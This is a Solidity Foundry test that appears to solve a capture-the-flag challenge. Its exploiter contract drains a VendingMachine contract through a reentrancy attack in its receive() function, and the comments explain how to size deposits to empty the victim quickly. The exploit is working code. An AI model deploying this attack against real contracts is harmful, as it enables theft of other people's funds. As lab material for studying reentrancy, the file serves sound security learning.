// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/VendingMachine.sol";

contract VendingMachineTest is BaseTest {
    VendingMachine private vendingMachine;

    constructor() {
        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(1, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        vendingMachine = VendingMachine(payable(0x00f4b86F1aa30a7434774f6Bc3CEe6435aE78174));
        vm.label(address(vendingMachine), "VendingMachine");

        assertEq(address(vendingMachine).balance, 1 ether);
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player);

        uint256 initialPlayerBalance = player.balance;
        uint256 initialVendingMachineBalance = address(vendingMachine).balance;

        VendingMachineExploiter exploiter = new VendingMachineExploiter{value: 1 ether}(vendingMachine);
        vm.label(address(exploiter), "VendingMachineExploiter");
        exploiter.exploit();

        // send back all the funds to the player
        exploiter.withdraw();

        vm.stopPrank();

        assertEq(player.balance, initialPlayerBalance + initialVendingMachineBalance);
        assertEq(address(vendingMachine).balance, 0 ether);
    }
}

contract VendingMachineExploiter {
    address private owner;
    VendingMachine private victim;
    bool private done = false;

    constructor(VendingMachine _victim) payable {
        // init
        owner = msg.sender;
        victim = _victim;

        // deposit the minimum amount we need to be able to start the attack
        // In order to correctly drain the victim contract you must deposit:
        // 1) at max what's already in the balance of the victim contract
        // 2) a divisor of the victim's balance. The lower the divisor is the longer it will
        // take to drain the contract (it will make multiple call to your `receive`) and
        // you could go into Out of Gas exception
        // In a real life scenario the best thing would be to match the victim's balance
        // to withdraw everything with just two call
        victim.deposit{value: 0.1 ether}();
    }

    function exploit() external {
        // Start the attack
        victim.withdrawal();
    }

    function withdraw() external {
        // Withdraw all the funds in the contract
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send ether");
    }

    receive() external payable {
        // The receive function will be called by the `VendingMachine.withdrawal` function
        // And we use it to re-enter into it until we have drained all the funds
        if (address(victim).balance != 0) {
            victim.withdrawal();
        }
    }
}
